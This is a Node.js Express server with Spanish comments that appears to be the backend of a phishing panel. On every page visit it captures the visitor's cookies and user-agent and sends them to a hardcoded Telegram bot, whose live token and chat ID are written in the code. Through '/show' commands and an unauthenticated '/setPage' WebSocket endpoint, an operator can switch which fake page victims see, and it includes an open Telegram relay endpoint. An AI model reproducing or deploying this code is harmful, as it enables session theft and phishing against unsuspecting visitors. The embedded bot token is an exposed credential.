const express = require("express");
const http = require("http");
const WebSocket = require("ws");
const Database = require("better-sqlite3");
const cookieParser = require("cookie-parser");
const axios = require("axios");
const cors = require("cors");
const path = require("path");

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// 🛠 Middlewares
app.use(express.json());
app.use(cookieParser());
app.use(cors());

// 🔥 Servir archivos estáticos (corrige el error de CSS, JS, imágenes)
app.use(express.static(path.join(__dirname, "public")));

// 🗄️ Base de datos SQLite
const db = new Database("control.db", { verbose: console.log });
db.exec("CREATE TABLE IF NOT EXISTS control (id INTEGER PRIMARY KEY, pagina TEXT)");

// 🔐 Credenciales de Telegram
const TELEGRAM_BOTS = [
    {
        token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", 
        chatId: "6328222257"
    }
];

// 📩 Función para notificar a Telegram
function sendTelegramMessage(userAgent, cookies) {
    console.log("🔍 Enviando mensaje a Telegram...");
    console.log("📌 User-Agent:", userAgent);
    console.log("🍪 Cookies:", cookies);

    const message = `👀 *Nuevo visitante en la página*  
📌 *User-Agent:* ${userAgent}  
🍪 *Cookies:* ${JSON.stringify(cookies)}  

📝 *Opciones:*  
➡️ /show pag1  
➡️ /show pag2  
➡️ /show pag3
➡️ /show pag4
➡️ /show pag5`;

    // 🔥 Enviar a todos los bots
    TELEGRAM_BOTS.forEach(bot => {
        axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
            chat_id: bot.chatId,
            text: message,
            parse_mode: "MarkdownV2",
        }).then(() => {
            console.log(`✅ Mensaje enviado a Telegram - Bot: ${bot.token}`);
        }).catch(error => {
            console.error(`❌ Error enviando mensaje al bot ${bot.token}:`, 
                error.response ? error.response.data : error.message
            );
        });
    });
}

// 📌 Endpoint para verificar el estado de la página
app.get("/check", (req, res) => {
    res.json({ pagina: "loader" });
});

// 🏠 Ruta principal (cuando un usuario entra a la página)
app.get("/", (req, res) => {
    const userAgent = req.headers["user-agent"];
    const cookies = req.cookies;
    console.log("📢 Nuevo visitante detectado:", { userAgent, cookies });

    sendTelegramMessage(userAgent, cookies);
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 🔌 WebSockets para actualización en tiempo real
wss.on("connection", (ws) => {
    console.log("🔌 Cliente WebSocket conectado");
    ws.send("loader");

    ws.on("close", () => {
        console.log("🔌 Cliente WebSocket desconectado");
    });
});

// ⚡ Endpoint para cambiar la página que se mostrará
app.post("/setPage", (req, res) => {
    const { pagina } = req.body;

    if (!pagina) {
        return res.status(400).json({ error: "Falta el parámetro 'pagina'" });
    }

    // 🛠 Corregido: Usar `INSERT OR REPLACE`
    db.prepare("INSERT OR REPLACE INTO control (id, pagina) VALUES (1, ?)").run(pagina);

    console.log(`✅ Página cambiada a: ${pagina}`);

    // 🔥 Notificar a todos los clientes WebSocket
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(pagina);
        }
    });

    res.json({ message: "Página actualizada" });
});

// 📩 Nuevo endpoint para enviar mensajes a Telegram desde el frontend
app.post('/enviar-telegram', async (req, res) => {
    try {
        const { token, chatId, mensaje } = req.body;

        // 🔐 Validación de datos
        if (!token || !chatId || !mensaje) {
            return res.status(400).json({ error: "Faltan datos requeridos (token, chatId o mensaje)" });
        }

        // 🛠 Enviar mensaje a Telegram
        const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: mensaje,
            parse_mode: "MarkdownV2"
        });

        console.log(`✅ Mensaje enviado exitosamente al bot: ${token}`);
        res.json({ success: true, message: "Mensaje enviado correctamente a Telegram" });

    } catch (error) {
        console.error(`❌ Error al enviar mensaje al bot ${req.body.token}:`, 
            error.response ? error.response.data : error.message
        );

        res.status(500).json({ 
            error: "Error al enviar mensaje a Telegram",
            details: error.response ? error.response.data : error.message
        });
    }
});

// 🚀 Iniciar servidor
const PORT = process.env.PORT|| 3000;
server.listen(PORT, () => console.log(`🌍 Servidor corriendo en http://0.0.0.0:${process.env.PORT|| 3000}`));